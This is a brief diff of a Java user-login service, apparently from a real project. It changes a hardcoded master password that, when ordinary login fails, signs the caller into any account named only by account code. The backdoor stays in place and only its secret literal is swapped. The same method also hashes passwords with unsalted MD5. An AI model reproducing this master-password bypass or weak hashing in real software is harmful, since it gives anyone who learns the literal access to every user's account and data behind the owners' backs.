@@ -73,7 +73,7 @@ public class UserPcService extends BasePcService {
     public RespVo<UserInfoRespVo> loginUser(UserLoginReqVo reqVo) {
         try {
             User accountUser = userService.selectByLogin(reqVo.getAccountCode(), MD5Util.md5("MD5", reqVo.getPassword()));
-            if (accountUser == null && StringUtils.equals(reqVo.getPassword(), "@12talk__")) {
+            if (accountUser == null && StringUtils.equals(reqVo.getPassword(), "@12talk54321")) {
                 accountUser = userService.selectByAccountCode(reqVo.getAccountCode());
             }
             Assert.notNull(accountUser, "Account does not exist or account password is incorrect");
